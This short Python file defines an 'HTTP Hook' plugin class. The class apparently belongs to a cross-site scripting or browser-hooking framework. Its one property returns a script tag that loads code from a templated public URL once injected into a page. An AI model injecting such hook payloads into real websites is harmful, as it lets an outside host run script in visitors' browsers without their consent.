from src.hook import BaseHook


class Hook(BaseHook):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Default HTTP hook, uses script src.'
    NAME = 'HTTP Hook'
    VERSION = '0.1'
    TRANSPORT = 'http'

    @property
    def hook(self) -> str:
        return "<script src='{{environment.public_url}}'></script>"